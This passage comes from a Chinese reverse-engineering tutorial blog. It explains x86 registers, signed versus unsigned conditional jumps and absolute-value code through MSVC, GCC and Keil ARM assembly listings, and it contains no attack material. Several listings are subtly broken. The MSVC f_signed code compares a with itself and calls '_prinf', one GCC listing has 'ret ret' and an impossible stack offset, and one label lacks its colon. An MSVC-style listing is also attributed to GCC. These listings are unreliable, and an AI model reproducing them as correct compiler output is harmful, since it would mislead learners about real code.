<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>寄存器位于CPU中，可以保存特定长度的数据。某些寄存器中保存的数据对于系统的运行有特殊的意义。<br>寄存器可以被装入数据，你可以在不同寄存器之间移动这些数据，或者做类似的事情，如四则运算、位运算等操作。</p>
<h3 id="通用寄存器的表示方法"><a href="#通用寄存器的表示方法" class="headerlink" title="通用寄存器的表示方法"></a>通用寄存器的表示方法</h3><p>80386上的通用寄存器<br><img src="/images/0680c5041bb56f5e04b6ae4a236b69a8b743239e.png" alt="微信截图_20171112113939.png"><br>上图中，数字表示的是<code>位</code>。可以看出，<code>EAX</code>是一个32-bit寄存器。同时，它的低16-bit又可以通过<code>AX</code>这个名字来访问；AX又被分为高、低8-bit两部分，分别由<code>AH</code>和<code>AL</code>表示。</p>
<h3 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h3><p>以下是通用寄存器的名称和习惯用法。</p>
<h4 id="EAX"><a href="#EAX" class="headerlink" title="EAX"></a>EAX</h4><p><code>EAX</code>，32-bit，通用寄存器，相对于其他寄存器，在<code>进行运算</code>方面比较常用。在保护模式中，也可以作为内存偏移指针（此时，DS作为<code>段寄存器</code>或<code>选择器</code>）。<br>####EBX<br><code>EBX</code>，32-bit，通用寄存器。通常作为<code>内存偏移指针</code>使用（相对于EAX、ECX、EDX），<code>DS</code>是默认的<code>段寄存器</code>或<code>选择器</code>。在保护模式中，同样可以起这个作用。<br>####ECX<br><code>ECX</code>，32-bit，通用寄存器，通常用于<code>特定指令的计数</code>。在保护模式中，也可以作为内存偏移指针（此时，DS作为寄存器或段选择器）。<br>####EDX<br><code>EDX</code>，32-bit，通用寄存器。在某些运算中作为<code>EAX的溢出寄存器</code>（例如乘、除）。在保护模式中，也可以作为内存偏移指针（此时，DS作为寄存器或段选择器）。<br><strong>上述寄存器同EAX一样包括对应的16-bit 和8-bit分组</strong></p>
<h4 id="ESI"><a href="#ESI" class="headerlink" title="ESI"></a>ESI</h4><p><code>ESI</code>，32-bit，通常在<code>内存操作指令</code>中作为<code>源地址指针</code>使用。当然，ESI可以被装入任意的数制，但通常没有人把它当做通用寄存器来用。DS作为寄存器或段选择器。</p>
<h4 id="EDI"><a href="#EDI" class="headerlink" title="EDI"></a>EDI</h4><p><code>EDI</code>，32-bit，通常在<code>内存操作指令</code>中作为<code>目的地址指针</code>使用。</p>
<h4 id="EBP"><a href="#EBP" class="headerlink" title="EBP"></a>EBP</h4><p><code>EBP</code>，32-bit，也是作为<code>指针</code>的寄存器。通常，它被高级语言编译器用以建造<code>堆栈帧</code>来保存函数或过程的<code>局部变量</code>。<code>SS</code>是它的默认段寄存器或选择器。<br><strong>注意，这三个寄存器<code>没有</code>对应的<code>8-bit分组</code>。但可以通过<code>SI</code>、<code>DI</code>，<code>BP</code>分别访问他们的<code>低16位</code>。</strong></p>
<h3 id="段寄存器和选择器"><a href="#段寄存器和选择器" class="headerlink" title="段寄存器和选择器"></a>段寄存器和选择器</h3><p>实模式下的段寄存器到保护模式下，摇身一变就成了选择器。不同的是，实模式下的<code>段选择器</code>是<code>16-bit</code>的，而保护模式下的<code>选择器</code>是<code>32-bit</code>的。</p>
<h4 id="CS-代码段"><a href="#CS-代码段" class="headerlink" title="CS 代码段"></a>CS 代码段</h4><p><code>CS</code>，代码段，或代码选择器。同<code>IP寄存器</code>一同<code>指向当前正在执行的地址</code>。处理器执行时从这个寄存器指向的段（实模式）或内存（保护模式）中获取指令。除了跳转或其他分支指令外，你无法修改这个寄存器的内容。</p>
<h4 id="DS-数据段"><a href="#DS-数据段" class="headerlink" title="DS 数据段"></a>DS 数据段</h4><p><code>DS</code>，数据段，或数据选择器。这个寄存器的<code>低16-bit</code>连同<code>ESI</code>一同<code>指向指令将要执行的内存</code>。同时，所有的内存操作指令默认情况下都用它指定操作段（实模式）或内存（保护模式下作为选择器）。这个寄存器<code>可被装入任意数值</code>，做法是先把数据给<code>AX</code>，在把它从AX传送给<code>DS</code>。当然也可通过堆栈来做。</p>
<h4 id="ES-附加段"><a href="#ES-附加段" class="headerlink" title="ES 附加段"></a>ES 附加段</h4><p><code>ES</code>，附加段，或附加选择器。这个寄存器的<code>低16-bit</code>连同<code>EDI</code>一同<code>指向指令将要处理的内存</code>。其他同<code>DS</code>。</p>
<h4 id="FS"><a href="#FS" class="headerlink" title="FS"></a>FS</h4><p><code>FS</code>，F段或F选择器。可以用这个寄存器<code>作为默认段寄存器或选择器的一个替代品</code>。</p>
<h4 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h4><p><code>GS</code>，G段或G选择器。它和<code>FS</code>几乎完全一样。</p>
<h4 id="SS"><a href="#SS" class="headerlink" title="SS"></a>SS</h4><p><code>SS</code>，堆栈段或堆栈选择器。这个寄存器的<code>低16-bit</code>连同<code>ESP</code>一同<code>指向下一次堆栈操作（push和pop）所要使用的堆栈地址</code>。这个寄存器也可以被装入任意数值，可通过入栈和出站操作来赋值。<br><strong>注意，一定不要在初学汇编阶段把这些寄存器弄混。段寄存器或选择器，在没有指定的情况下都是使用默认的那个。这句话在现在看来可能有点稀里糊涂，不过你很快会在后面知道如何去做。</strong></p>
<h3 id="特殊寄存器"><a href="#特殊寄存器" class="headerlink" title="特殊寄存器"></a>特殊寄存器</h3><h4 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h4><p><code>EIP</code>，32-bit，这个寄存器非常重要，同<code>CS</code>一同<code>指向即将执行的那条指令的地址</code>。不能够直接修改这个寄存器的值，修改它的唯一方法是跳转或分支指令。（CS是默认的段或选择器）</p>
<h4 id="ESP"><a href="#ESP" class="headerlink" title="ESP"></a>ESP</h4><p><code>ESP</code>，32-bit，这个寄存器<code>指向堆栈中即将被操作的那个地址</code>。尽管可以修改它的值，但并不提倡这样做，可能会破坏堆栈。（SS是默认的段或选择器）<br><code>IP</code>： Instruction Pointer，指令指针。<br><code>SP</code>： Stack Pointer，堆栈指针。</p>
<h3 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h3><p><img src="/images/ba55d64305b1fd50da59b0a26241808a801d3ac9.png" alt="微信截图_20171112154249.png"></p>
<h3 id="其他寄存器"><a href="#其他寄存器" class="headerlink" title="其他寄存器"></a>其他寄存器</h3><p><code>CR0</code>、<code>CR2</code>、<code>CR3</code>（控制寄存器）。例如<code>CR0</code>的作用是<code>切换实模式和保护模式</code>。<br><code>D0</code>、<code>D1</code>、<code>D2</code>、<code>D3</code>、<code>D6</code>和<code>D7</code>（调试寄存器），他们可以<code>作为调试器的硬件支持来设置条件断点</code>。<br><code>TR3</code>、<code>TR4</code>、<code>TR5</code>、<code>TR6</code>、<code>TR?</code>寄存器（测试寄存器）用于某些<code>条件测试</code>。</p>
<h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><p>整理学习笔记，把学到的东西用自己的语言重新记录一遍</p>
]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title>逆向工程——条件转移指令</title>
    <url>/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%9D%A1%E4%BB%B6%E8%BD%AC%E7%A7%BB%E6%8C%87%E4%BB%A4.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="数值比较"><a href="#数值比较" class="headerlink" title="数值比较"></a>数值比较</h2><h3 id="主要程序"><a href="#主要程序" class="headerlink" title="主要程序"></a>主要程序</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void f_signed(int a,int b)</span><br><span class="line">&#123;</span><br><span class="line">	if(a&gt;b)</span><br><span class="line">		printf(&quot;a&gt;b\n&quot;);</span><br><span class="line">	if(a==b)</span><br><span class="line">		printf(&quot;a==b\n&quot;);</span><br><span class="line">	if(a&lt;b)</span><br><span class="line">		printf(&quot;a&lt;b\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void f_unsigned(unsigned int a,int b)</span><br><span class="line">&#123;</span><br><span class="line">	if(a&gt;b)</span><br><span class="line">		printf(&quot;a&gt;b\n&quot;);</span><br><span class="line">	if(a==b)</span><br><span class="line">		printf(&quot;a==b\n&quot;);</span><br><span class="line">	if(a&lt;b)</span><br><span class="line">		printf(&quot;a&lt;b\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	f_signed(1,2);</span><br><span class="line">	f_unsigned(1,2);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><h4 id="x86-msvc"><a href="#x86-msvc" class="headerlink" title="x86+msvc"></a>x86+msvc</h4><p>关闭优化选项时，可得到f_signed()函数:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_a$ = 8</span><br><span class="line">_b$ = 12</span><br><span class="line">_f_signed PROC</span><br><span class="line">	push ebp</span><br><span class="line">	mov ebp,esp</span><br><span class="line">	mov eax,DWORD PTR _a$[ebp]</span><br><span class="line">	cmp eax,DWORD PTR _a$[ebp]</span><br><span class="line">	jle SHORT $LN3@f_signed</span><br><span class="line">	push OFFSET $SG737   ;&#x27;a&gt;b&#x27;</span><br><span class="line">	call _printf</span><br><span class="line">	add esp,4</span><br><span class="line">$LN3@f_signed:</span><br><span class="line">	mov ecx,DWORD PTR _a$[ebp]</span><br><span class="line">	cmp ecx,DWORD PTR _b$[ebp]</span><br><span class="line">	jne SHORT $LN2@f_signed</span><br><span class="line">	push OFFSET $SG739    ;&#x27;a==b&#x27;</span><br><span class="line">	call _printf</span><br><span class="line">	add esp,4</span><br><span class="line">$LN2@f_signed:</span><br><span class="line">	mov edx,DWORD PTR _a$[ebp]</span><br><span class="line">	cmp edx,DWORD PTR _a$[ebp]</span><br><span class="line">	jge SHORT $$LN4@f_signed</span><br><span class="line">	push OFFSET $SG741    ;&#x27;a&lt;b&#x27;</span><br><span class="line">	call _prinf</span><br><span class="line">$LN4@f_signed:</span><br><span class="line">	pop ebp</span><br><span class="line">	ret 0</span><br><span class="line"></span><br><span class="line">_f_signed ENDP</span><br></pre></td></tr></table></figure>
<p>第一个条件转一会领是JLE，即“Junp if Less or Equal”。如果上一条CMP指令的第一个操作数表达式小于或等于（不大于）第二个表达式，JLE将跳转到指令所标明的地址；如果不满足上述条件，则运行下一条指令，就本例而言程序将会调用printf（）函数，第二个条件转移指令是JNE，”Jump if Not Equal“,如果上一条CMP指令的两个操作符不相等，则进行相应跳转。<br>第三个转移指令是JGE，即”Jump if Greater or Equal“，如果CMP的第一个表达式大于或等于第二个表达式（不小于），则进行跳转。这段程序里，如果三个跳转的判断条件都不满足，将不会调用pringtf（）函数；不过除非进行特殊干预，，否则这种情况应该不会发生。<br>现在我们观察 f_unsigned()函数的汇编指令。f_unsigned()函数和 f_signed()函数大体相同。它们的区别集中体现在条件转移指令上:f_unsinged()函数的使用的条件转移指令是 JBE 和 JAE,而 f_signed()函数使用的条件转移指令则是 JLE 和 JGE。<br>使用 GCC 编译上述程序,可得到 f_unsigned()的汇编指令如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_a$=8   ;size=4</span><br><span class="line">_b$=12  ;size=4</span><br><span class="line">_f_unsifned PROC</span><br><span class="line">	push ebp</span><br><span class="line">	mov ebp,esp</span><br><span class="line">	mov eax,DWORD PTR _a$[ebp]</span><br><span class="line">	cmp eax,DWORD PTR _b$[ebp]</span><br><span class="line">	jbe SHORT $LN3@f _unsigned</span><br><span class="line">	push OFFSET $SG2761    &#x27;a&gt;b&#x27;</span><br><span class="line">	call _printf</span><br><span class="line">	add esp,4</span><br><span class="line">$LN3@f _unsigned:</span><br><span class="line">	mov ecx,DWORD PTR _a$[ebp]</span><br><span class="line">	cmp ecx,DWORD PTR _b$[ebp]</span><br><span class="line">	jne SHORT $LN2@f_unsigned</span><br><span class="line">	push OFFSET $SG2763  ; &#x27;a==b&#x27;</span><br><span class="line">	call _printf</span><br><span class="line">	add esp, 4</span><br><span class="line">$LN2@f_unsigned:</span><br><span class="line">	mov edx,DWORD PTR _a$[ebp]</span><br><span class="line">	cmp edx,DWORD PTR _b$[ebp]</span><br><span class="line">	jae SHORT $LN4@f_unsigned</span><br><span class="line">	push OFFSET $SG2765   ; &#x27;a&lt;b&#x27;</span><br><span class="line">	call _printf</span><br><span class="line">	add esp, 4</span><br><span class="line">LN4@f_unsigned:</span><br><span class="line">	pop ebp</span><br><span class="line">	Ret 0</span><br><span class="line">_f_unsigned ENDP</span><br></pre></td></tr></table></figure>
<p>GCC 编译的结果与 MSVC 编译的结果基本相同。<br>经 GCC 编译后,f_unsigned()函数使用的条件转移指令是 JBE(Jump if Below or Equal,相当于 JLE)和 JAE(Jump if Above or Equal,相当于 JGE)。JA&#x2F;JAE&#x2F;JB&#x2F;JBE 与 JG&#x2F;JGE&#x2F;JL&#x2F;JLE 的区别,在于它们检查的标志位不同:前者检查借&#x2F;进位标志位 CF(1 意味着小于)和零标志位 ZF(1 意味着相等),后者检查“SF<br>XOR OF”(1 意味着异号)和 ZF。从指令参数的角度看,前者适用于 unsigned (无符号)类型数据的(CMP)运算,而后者的适用于 signed(有符号)类型数据的运算。可见,根据条件转移的指令,我们可以直接判断 CMP 所比较的变量的数据类型。</p>
<p>接下来,我们一起研究 main()函数的汇编代码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_main PROC</span><br><span class="line">	push ebp</span><br><span class="line">	mov ebp,esp</span><br><span class="line">	push 2</span><br><span class="line">	push 1</span><br><span class="line">	call _f_signed</span><br><span class="line">	add esp,8</span><br><span class="line">	push 2</span><br><span class="line">	push 1</span><br><span class="line">	call _f_unsigned</span><br><span class="line">	add esp,8</span><br><span class="line">	xor eax,eax</span><br><span class="line">	pop ebp</span><br><span class="line">	ret 0</span><br><span class="line">_main ENDP</span><br></pre></td></tr></table></figure>
<h4 id="x86-MSVC-OllDbg"><a href="#x86-MSVC-OllDbg" class="headerlink" title="x86+MSVC+OllDbg"></a>x86+MSVC+OllDbg</h4><p>我们可以通过 OllyDbg 直观地观察到指令对标志寄存器的影响。我们先用 OllyDbg 观察 f_unsigned()函数比较无符号数的过程。f_unsigned()函数使用了 CMP 指令,分三次比较了两个相同的 unsigned 类型数据。因为参数相同,所以 CMP 设置的标志位必定相同。<br>如下图 所示,在运行到第一个条件转移指令时,C&#x3D;1, P&#x3D;1, A&#x3D;1, Z&#x3D;0, S&#x3D;1, T&#x3D;0, D&#x3D;0, O&#x3D;0。OllyDbg会使用标志位的首字母作为该标志位的简称.<br>OllyDbg 在左下窗口进行提示,JBE 条件跳转指令的条件已经达成,下一步会进行相应跳转。这种预测准确无误,JBE 的触发条件是(CF&#x3D;1 或 ZF&#x3D;1)。条件表达式为真时,JBE 确实会进行跳转。<br><img src="/images/580ed4d7a27514ace73ff4494450f5940e6cebc3.png" alt="01.png"><br>如下图所示,在运行到第二个条件转移指令——JNZ 指令时,ZF&#x3D;0。所以 OllyDbg 能够判断程序会进行相应跳转<br><img src="/images/b34259296524fba6ee3624fcdd6cf7f9d7bd1673.png" alt="02.png"><br>如下图所示,运行到第三个条件转移指令——JNB 指令的时候,借&#x2F;进位标志 CF&#x3D;0,条件表达式会为假,所以不会发生跳转,程序将执行第三个 printf()指令。<br><img src="/images/0e25f1f9c88bd3dd66293bae9952cec7a6a5dfc5.png" alt="03.png"></p>
<p>现在来调试下示例程序里的 f_signed()函数,它的参数为 signed 型数据。<br>在运行 f_signed()函数时,标志位的状态和刚才一样。即,运行 CMP 指令之后, C&#x3D;1, P&#x3D;1, A&#x3D;1, Z&#x3D;0, S&#x3D;1,T&#x3D;0, D&#x3D;0, O&#x3D;0。<br>第一个条件转移指令——JLE 指令将会被触发,如下图所示：<br><img src="/images/e7c2977fad694173c565d5865660ebd8565a737e.png" alt="11.png"><br>触发 JLE 的条件是 ZF&#x3D;1 或 SF≠OF。本例满足 SF≠OF 的条件。由于 ZF&#x3D;0,第二个条件转移指令——JNZ 指令会被触发,如下图所示：<br><img src="/images/48b2cada6dba2552b832c767976c8d651d7da4ea.png" alt="12.png"><br>而第三个条件转移指令——JGE 指令不会被触发。触发 JGE 的条件是 SF&#x3D;OF,而当前情形不满足这个条件,如下图所示：<br><img src="/images/c6eef2fc870cd95ed7191320b0c8f2761c4580cf.png" alt="13.png"></p>
<h3 id="GCC"><a href="#GCC" class="headerlink" title="GCC"></a>GCC</h3><h4 id="Non-optimizing-GCC"><a href="#Non-optimizing-GCC" class="headerlink" title="Non-optimizing GCC"></a>Non-optimizing GCC</h4><p>如果关闭了GCC的优化选项,那么它编译出来的程序和MSVC编译出来的程序没什么区别,只不过就是把printf()函数替换为了puts()函数。</p>
<h4 id="Optimizing-GCC"><a href="#Optimizing-GCC" class="headerlink" title="Optimizing GCC"></a>Optimizing GCC</h4><p>既然 CMP 比较的是相同的值,比较之后的标志位的状态也相同,那么何必要对同样的参数进行多次比较呢?或许 MSVC 真的不能再智能一些了;但是启用优化选项后,GCC 4.8.1 确实能够进行这种深度优化<br>指令清单  GCC 4.8.1 f_signed()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f_signed:</span><br><span class="line">	mov eax, DWORD PTR [esp+8]</span><br><span class="line">	cmp DWORD PTR [esp+4], eax</span><br><span class="line">	jg .L6</span><br><span class="line">	je .L7</span><br><span class="line">	jge .L1</span><br><span class="line">	mov DWORD PTR [esp+4], OFFSET FLAT:.LC2 ; &quot;a&lt;b&quot;</span><br><span class="line">	jmp puts</span><br><span class="line">.L6:</span><br><span class="line">	mov DWORD PTR [esp+4], OFFSET FLAT:.LC0 ; &quot;a&gt;b&quot;</span><br><span class="line">	jmp puts</span><br><span class="line">.L1</span><br><span class="line">	ret ret</span><br><span class="line">.L7</span><br><span class="line">	mov DWORD PTR [esp+4], OFFSET FLAT:.LC1 ; &quot;a==b&quot;</span><br><span class="line">	jmp puts</span><br></pre></td></tr></table></figure>
<p>很明显,它使用 jmp 指令替代了臃肿的“CALL ……puts …… RETN”指令。<br>在 x86 的系统中,这种程序比较少见。MSVC 2012 做不到 GCC 那种程度的深度优化。<br>另一方面,汇编语言的编程人员确实可能学会 Jcc 指令的连用技巧。所以,如果您遇到了这样精简的程序,而且还能够判断出它不是 GCC 编译出来的程序,那么您基本上可以判断它是手写出来的汇编程序。<br>即使开启了同样的优化选项,f_unsigned()函数对应的指令也没有那么精致:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f_unsigned:</span><br><span class="line">	push esi</span><br><span class="line">	push ebx</span><br><span class="line">	sub esp,20</span><br><span class="line">	mov esi,DWORD PTR [esp+32]</span><br><span class="line">	mov ebx,DWORD PTR [esp+64]</span><br><span class="line">	cmp esi,ebx</span><br><span class="line">	ja .L13</span><br><span class="line">	cmp esi,ebx    ; instruction may be removed</span><br><span class="line">	je .L14</span><br><span class="line">.L10:</span><br><span class="line">	jb .L15</span><br><span class="line">	add esp, 20</span><br><span class="line">	pop ebx</span><br><span class="line">	pop esi</span><br><span class="line">	ret</span><br><span class="line">.L15:</span><br><span class="line">	mov DWORD PTR [esp+32], OFFSET FLAT:.LC2 ; &quot;a&lt;b&quot;</span><br><span class="line">	add esp, 20</span><br><span class="line">	pop ebx</span><br><span class="line">	pop esi</span><br><span class="line">	jmp puts</span><br><span class="line">.L13:</span><br><span class="line">	mov DWORD PTR [esp], OFFSET FLAT:.LC0 ; &quot;a&gt;b&quot;</span><br><span class="line">	call puts</span><br><span class="line">	cmp esi, ebx</span><br><span class="line">	jne .L10</span><br><span class="line">.L14:</span><br><span class="line">	mov DWORD PTR [esp+32], OFFSET FLAT:.LC1 ; &quot;a==b&quot;</span><br><span class="line">	add esp, 20</span><br><span class="line">	pop ebx</span><br><span class="line">	pop esi</span><br><span class="line">	jmp puts</span><br></pre></td></tr></table></figure>
<p>程序中只有两条 CMP 指令,至少它优化去了一个 CMP 指令。可见,GCC 4.8.1 的优化算法还有改进的空间.</p>
<h3 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h3><p>32 位 ARM 程序</p>
<h4 id="Optimizing-Keil-6-x2F-2013-ARM-mode"><a href="#Optimizing-Keil-6-x2F-2013-ARM-mode" class="headerlink" title="Optimizing Keil 6&#x2F;2013 (ARM mode)"></a>Optimizing Keil 6&#x2F;2013 (ARM mode)</h4><p>指令清单 Optimizing Keil 6&#x2F;2013 (ARM mode)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000B8				EXPORT f_signed</span><br><span class="line">.text:000000B8		f_signed 		; CODE XREF: main+C</span><br><span class="line">.text:000000B8 70 40 2D E9	STMFD SP!, &#123;R4-R6,LR&#125;</span><br><span class="line">.text:000000BC 01 40 A0 E1	MOV R4, R1</span><br><span class="line">.text:000000C0 04 00 50 E1	CMP R0, R4</span><br><span class="line">.text:000000C4 00 50 A0 E1	MOV R5, R0</span><br><span class="line">.text:000000C8 1A 0E 8F C2	ADRGT R0, aAB     ; &quot;a&gt;b\n&quot;</span><br><span class="line">.text:000000CC A1 18 00 CB	BLGT __2printf</span><br><span class="line">.text:000000D0 04 00 55 E1	CMP R5, R4</span><br><span class="line">.text:000000D4 67 0F 8F 02	ADREQ R0, aAB_0; &quot;a==b\n&quot;</span><br><span class="line">.text:000000D8 9E 18 00 0B	BLEQ __2printf</span><br><span class="line">.text:000000DC 04 00 55 E1	CMP R5,R4</span><br><span class="line">.text:000000E0 70 80 BD A8	LDMGEFD SP!, &#123;R4-R6,PC&#125;</span><br><span class="line">.text:000000E4 70 40 BD E8	LDMFD SP!, &#123;R4-R6,LR&#125;</span><br><span class="line">.text:000000E8 19 0E 8F E2	ADR R0, aAB_1 ; &quot;a&lt;b\n&quot;</span><br><span class="line">.text:000000EC 99 18 00 EA	B __2printf</span><br><span class="line">.text:000000EC ; End of function f_signed</span><br></pre></td></tr></table></figure>
<p>RM 模式的多数指令都存在着相应的条件执行指令。这些派生出来的条件执行指令仅会在特定标志位为 1的情况下执行。换句话说,只有当前面存在比较数值的指令时,后面才可能会出现这种派生出来的条件执行指令。<br>举例来讲,加法指令 ADD 指令实际上是 ADDAL 指令。“AL”就是 always 的缩写,即 ADDAL 总会被无条件执行。在 32 位的 ARM 指令中,条件判断表达式被封装在条件执行指令的前(最高) 4 位——条件字段(conditionfield)里。即使是无条件转移指令 B 指令,其前 4 位还是条件字段。从指令构成上说,B 指令仍然属于条件转移指令,只不过它的条件字段是 AL 而已。顾名思义,AL 的作用就是忽略标志寄存器、永远执行这条指令。<br>ADRGT 指令中的 GT 代表 greater than(大于)。该指令依据先前 CMP 指令的比较结果,而判断是否执行寻址指令。当且仅当 CMP 比较的第一个值大于第二个值的时候,ADRGT 指令才会执行寻址(ADR)指令。<br>后面的 BLGT 指令有异曲同工之妙。仅在相同条件下,即当且仅当 CMP 比较的第一个值大于第二个值的时候,BLGT 指令才会执行 BL 指令。在这个条件成立的时候,前面的 ADRGT 指令已经把字符串“a&gt;b &#x2F;n”的地址赋值给 R0 寄存器,成为了 printf()的参数,而 BLGT 负责调用 printf()。可见,当且仅当在 R0 的值(变量 a)大于R4 的值(变量 b)的情况下,计算机才会运行后面那组带有-GT 后缀的指令。很显然,这是一组相互关联的指令。<br>后面的 ADREQ 和 BLEQ 指令,都在最近一个 CMP 的操作数相等的情况下才会讲行 ADR 和 BL 指令的操作。程序之中连续两次出现“CMP R5, R4”指令,这是因为夹在其间的 printf()函数可能会影响标志位。<br>LDMGEFD 是“Great or Equal (大于或等于)”的情况下进行 LDMFD (Load Multiple Full Descending) 操作的指令。依此类推,“LDMGEFD SP!, {R4-R6,PC}”指令起到函数尾声的作用,不过它只会在“a&gt;&#x3D;b”的时候才会结束本函数。<br>如果上述条件不成立,即“a&lt;b”的时候,会执行下一条指令“LDMFD SP!, {R4-R6,LR}”。这同样起到函数尾声的作用。该指令将恢复 R4~R6 寄存器、LR 寄存器的值,而不恢复 PC 寄存器的值,且不会退出当前函数。<br>函数最后的两条指令,分别向 printf()函数传递参数(字符串“a&lt;b\n”),并且调用 printf()函数。当调用方函数调用(跳转到)printf()函数之后,调用方函数可以伴随 printf()函数<br>退出而退出。<br>f_unsigned()函数与 f_signed()函数的功能十分类似。不同之处是它用到了 ADRHI、BLHI 和 LDMSFD指令。指令尾部的-HI 代表 Unsigned Higher,CS 代表 Carry Set (greater than or equal)。因为参数的数据类型有所变化,所以这两个函数的具体指令有所区别。<br>这个程序的 main()函数的汇编指令如下<br>指令清单 main()函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000128			EXPORT main</span><br><span class="line">.text:00000128		main</span><br><span class="line">.text:00000128 10 40 2D E9	STMFD SP!, &#123;R4,LR&#125;</span><br><span class="line">.text:0000012C 02 10 A0 E3	MOV R1, #2</span><br><span class="line">.text:00000130 01 00 A0 E3	MOV R0, #1</span><br><span class="line">.text:00000134 DF FF FF EB	BL f_signed</span><br><span class="line">.text:00000138 02 10 A0 E3	MOV R1, #2</span><br><span class="line">.text:0000013C 01 00 A0 E3	MOV R0, #1</span><br><span class="line">.text:00000140 EA FF FF EB	BL f_unsigned</span><br><span class="line">.text:00000144 00 00 A0 E3	MOV R0, #0</span><br><span class="line">.text:00000148 10 80 BD EB	LDMFD SP!, &#123;R4,PC&#125;</span><br><span class="line">.text:00000148		; End of function main</span><br></pre></td></tr></table></figure>

<p>可见,ARM 模式的程序可以完全不依赖条件转移指令。<br>这样做有什么优点呢?依赖精简指令集(RISC)的ARM处理器采用流水线技术(pipeline)<br>。简单地说,这种处理器在跳转指令方面的性能不怎么优越,所以它们的分支预测处理器(branch predictor unites)决定了整体的性能。对于采用流水线技术的处理器来说,运行其上的程序跳转次数越少(无论是条件转移还是无条件转移),程序的性能就越高。条件执行指令 ,会受益于其跳跃次数最少的优点,体现出最高的效率。<br>x86 指令集里只有 CMOVcc 指令,没有其他的条件执行指令了。CMOVcc 指令是仅在特定标志位为 1(通常由 CMP 指令设置)的情况下才会执行 MOV 操作的条件执行指令。</p>
<h2 id="计算绝对值"><a href="#计算绝对值" class="headerlink" title="计算绝对值"></a>计算绝对值</h2><h3 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int my_abs (int i)</span><br><span class="line">&#123;</span><br><span class="line">	if (i&lt;0)</span><br><span class="line">		return -i;</span><br><span class="line">	else</span><br><span class="line">		return i;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="Optimizing-MSVC"><a href="#Optimizing-MSVC" class="headerlink" title="Optimizing MSVC"></a>Optimizing MSVC</h3><p>指令清单 Optimizing MSVC 2012 x64</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i$ = 8</span><br><span class="line">my_abs PROC</span><br><span class="line">; ECX = input</span><br><span class="line">	test   ecx, ecx</span><br><span class="line">; check for sign of input value</span><br><span class="line">; skip NEG instruction if sign is positive</span><br><span class="line">	jns SHORT $LN2@my_abs</span><br><span class="line">; negate value</span><br><span class="line">	neg ecx</span><br><span class="line">$LN2@my_abs:</span><br><span class="line">; prepare result in EAX:</span><br><span class="line">	mov eax,ecx</span><br><span class="line">	ret 0</span><br><span class="line">my_abs ENDP</span><br></pre></td></tr></table></figure>
<p>GCC 4.9 的编译结果几乎相同。</p>
<h3 id="Optimizing-Keil-6-x2F-2013-Thumb-mode"><a href="#Optimizing-Keil-6-x2F-2013-Thumb-mode" class="headerlink" title="Optimizing Keil 6&#x2F;2013: Thumb mode"></a>Optimizing Keil 6&#x2F;2013: Thumb mode</h3><p>指令清单  Optimizing Keil 6&#x2F;2013:Thumb mode</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my_abs PROC</span><br><span class="line">	CMP r0,#0</span><br><span class="line">; is input value equal to zero or greater than zero?</span><br><span class="line">; skip RSBS instruction then</span><br><span class="line">	BGE |L0.6|</span><br><span class="line">; subtract input value from 0:</span><br><span class="line">	RSBS r0,r0,#0</span><br><span class="line">|L0.6|</span><br><span class="line">	BX lr</span><br><span class="line">	ENDP</span><br></pre></td></tr></table></figure>
<p>ARM 平台没有负数运算指令,所以 Keil 编译器使用了“零减去数值”的减法运算指令“Reverse Subtract”(减数和被减数位置对调的减法运算),同样达到了替换符号的效果。</p>
<h3 id="Optimizing-Keil-6-x2F-2013-ARM-mode-1"><a href="#Optimizing-Keil-6-x2F-2013-ARM-mode-1" class="headerlink" title="Optimizing Keil 6&#x2F;2013: ARM mode"></a>Optimizing Keil 6&#x2F;2013: ARM mode</h3><p>因为 ARM 模式的指令集存在条件执行指令,所以开启优化选项后可得到如下指令。<br>指令清单  Optimizing Keil 6&#x2F;2013:ARM mode</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my_abs PROC</span><br><span class="line">	CMP</span><br><span class="line">r0,#0</span><br><span class="line">; execute &quot;Reverse Subtract&quot; instruction only if input value is less than 0:</span><br><span class="line">	RSBLT r0,r0,#0</span><br><span class="line">	BX lr</span><br><span class="line">	ENDP</span><br></pre></td></tr></table></figure>
<p>即使没有使用条件转移指令它也实现相同的功能</p>
<h3 id="Non-optimizng-GCC-4-9-ARM64"><a href="#Non-optimizng-GCC-4-9-ARM64" class="headerlink" title="Non-optimizng GCC 4.9 (ARM64)"></a>Non-optimizng GCC 4.9 (ARM64)</h3><p>ARM64 的指令集存在求负运算的 NEG 指令。<br>指令清单  Optimizing GCC 4.9 (ARM64)</p>
